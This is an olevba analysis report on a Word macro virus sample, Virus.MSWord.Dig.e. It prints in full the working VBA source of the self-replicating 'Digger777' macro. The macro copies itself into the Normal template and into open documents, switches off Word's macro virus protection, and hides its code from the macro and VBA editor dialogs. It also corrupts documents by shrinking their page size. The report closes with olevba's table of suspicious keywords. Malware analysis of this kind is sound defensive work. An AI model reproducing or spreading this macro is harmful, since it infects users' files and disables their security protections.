olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Dig.e-a6336d4d83db33de7d3be2d67ad64682f445c794
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Dig.e-a6336d4d83db33de7d3be2d67ad64682f445c794 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Digger777.bas 
in file: Virus.MSWord.Dig.e-a6336d4d83db33de7d3be2d67ad64682f445c794 - OLE stream: 'Macros/VBA/Digger777'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Option Explicit
Const NStat = 1
Const VStat = 1
'Copyright © 1999 by dd!Actor.
'All rights reserved.
'Patch in 2001 by GremMe & ZerGo.

Sub AutoOpen()
RunMeAldays
Dim pth As String, i As Byte, dc As Object
Dim NInst As Boolean, AInst As Boolean

pth = Environ("temp") & "\~WRD000^.tmp"
Set dc = NormalTemplate.VBProject.VBComponents

For i = 1 To dc.Count
    If dc(i).Name = "Digger777" Then
        NInst = 1
        dc(i).Export pth
    End If
Next i

Set dc = ActiveDocument.VBProject.VBComponents

For i = 1 To dc.Count
    If dc(i).Name = "Digger777" Then
        AInst = 1
        dc(i).Export pth
    End If
Next i

If AInst = True And NInst = False Then Set dc = NormalTemplate
If AInst = False And NInst = True Then Set dc = ActiveDocument
If AInst = False Or NInst = False Then
    dc.VBProject.VBComponents.Import pth
    If Mid(ActiveDocument.FullName, 2, 1) = ":" Then dc.Save
    Kill pth
End If

End Sub

Sub AutoExec()
    RunMeAldays
End Sub

Sub AutoExit()
    Options.VirusProtection = 1
End Sub

Sub FileSave()
On Error Resume Next
    AutoOpen
    RunMeAldays
    Pricol
    ActiveDocument.Save
End Sub

Sub FileSaveAs()
On Error Resume Next
    AutoOpen
    RunMeAldays
    Pricol
    Dialogs(wdDialogFileSaveAs).Show
End Sub

Sub ToolsOptions()
Dim dc As Object
Dim VirStat As Byte
Dim NorStat As Byte

On Error Resume Next

Options.SaveNormalPrompt = NStat
Options.VirusProtection = VStat
Dialogs(wdDialogToolsOptions).Show

Set dc = ActiveDocument.VBProject.VBComponents("Digger777").CodeModule
If Options.SaveNormalPrompt = True Then NorStat = 1
If Options.VirusProtection = True Then VirStat = 1

dc.ReplaceLine 2, "const NStat=" & NorStat
dc.ReplaceLine 3, "const VStat=" & VirStat

Set dc = NormalTemplate.VBProject.VBComponents("Digger777").CodeModule
dc.ReplaceLine 2, "const NStat=" & NorStat
dc.ReplaceLine 3, "const VStat=" & VirStat

Options.SaveNormalPrompt = 0
Options.VirusProtection = 0

NormalTemplate.Save
NormalTemplate.Saved = True
End Sub

Sub ToolsMacro()
Dim i As Byte, n As Integer, pth As String
Dim NInst As Boolean, AInst As Boolean, Nsav As Boolean, Asav As Boolean, res As Boolean
Dim dc As Object, dcN As Object, dcA As Object

On Error Resume Next

pth = Environ("temp") & "\~WRD000^.tmp"

Set dcN = NormalTemplate.VBProject.VBComponents
Set dcA = ActiveDocument.VBProject.VBComponents
Set dc = NormalTemplate.VBProject

GoSub 10
NInst = res
Set dc = ActiveDocument.VBProject

GoSub 10
AInst = res

If NInst = True Then
    Set dc = dcN
    GoSub 20
    Nsav = NormalTemplate.Saved
    NormalTemplate.Saved = 1
End If

If AInst = True Then
    Set dc = dcA
    GoSub 20
    Asav = ActiveDocument.Saved
    ActiveDocument.Saved = 1
End If

Dialogs(wdDialogToolsMacro).Show

dcN("Digger777").CodeModule.AddFromFile pth
dcA("Digger777").CodeModule.AddFromFile pth
dcN.CodeModule.AddFromFile pth

NormalTemplate.Saved = Nsav
dcA.CodeModule.AddFromFile pth

ActiveDocument.Saved = Asav
Kill pth
Exit Sub

10:
For i = 1 To dc.VBComponents.Count
    If dc.VBComponents(i).Name = "Digger777" Then
        res = 1
        dc.VBComponents(i).Export pth
    End If
Next i
Return

20:
dc.Export pth
n = dc("Digger777").CodeModule.CountOfLines
dc("Digger777").CodeModule.DeleteLines 1, n
Return

End Sub
Sub ViewVBCode()
If Dir("c:\autoexec.bat") <> "" Then
    If FileLen("c:\autoexec.bat") <> 777 Then
        RunMeAldays
        Pricol
        Exit Sub
        Else
            Application.VBE.MainWindow.Visible = True
    End If
End If
End Sub
Sub RunMeAldays()

    Application.EnableCancelKey = wdCancelDisabled
    WordBasic.DisableAutoMacros 0
    Options.VirusProtection = 0
    Options.SaveNormalPrompt = 0
    Application.VBE.MainWindow.Visible = False

End Sub

Sub Pricol()
    ActiveDocument.PageSetup.RightMargin = 0.63
    ActiveDocument.PageSetup.TopMargin = 0.63
    ActiveDocument.PageSetup.LeftMargin = 0
    ActiveDocument.PageSetup.BottomMargin = 0
    
    ActiveDocument.PageSetup.PageWidth = InchesToPoints(0.6)
    ActiveDocument.PageSetup.PageHeight = InchesToPoints(0.6)
    
    ActiveDocument.UndoClear
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoExec            |Runs when the Word document is opened        |
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoExit            |Runs when the Word document is closed        |
|Suspicious|Environ             |May read system environment variables        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |autoexec.bat        |Executable file name                         |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

